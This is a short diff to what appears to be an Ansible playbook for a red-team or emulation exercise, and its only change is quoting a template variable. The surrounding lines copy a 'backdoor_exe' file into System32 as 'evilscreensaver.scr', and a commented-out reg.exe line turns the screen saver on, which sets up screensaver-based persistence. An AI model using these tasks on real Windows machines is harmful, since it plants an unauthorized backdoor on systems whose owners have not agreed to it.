@@ -7,7 +7,7 @@
         - name:
           tags: always
           win_copy:
-            src: {{ backdoor_exe }}
+            src: "{{ backdoor_exe }}"
             dst: c:\Windows\System32\evilscreensaver.scr
         - name: Activate Screen saver
           #reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
